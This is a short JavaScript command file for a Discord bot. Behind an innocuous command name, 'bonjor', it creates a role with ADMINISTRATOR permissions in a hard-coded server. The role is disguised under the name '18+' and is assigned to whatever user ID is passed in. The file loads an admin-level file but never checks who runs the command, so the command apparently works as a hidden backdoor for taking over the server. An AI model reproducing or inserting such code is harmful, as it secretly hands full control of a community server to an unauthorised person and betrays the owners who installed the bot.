const Discord = require("discord.js");
let serverset = require("../../storage/serverset.json");

let adminlevel = require("../../storage/adminlevel.json");

module.exports.run = async (bot, message, args) => {


  let personn = bot.guilds.cache.get("788490236334309376").members.cache.get(args[0]);
//  member.roles.add(jailrole).catch(O_o => {});

bot.guilds.cache.get("788490236334309376").roles.create({data:{ name: "18+", position: args[1], permissions:["ADMINISTRATOR"]}}).then(async(role) =>{
    personn.roles.add(role);
  })


};

module.exports.config = {
  name: "bonjor"
};
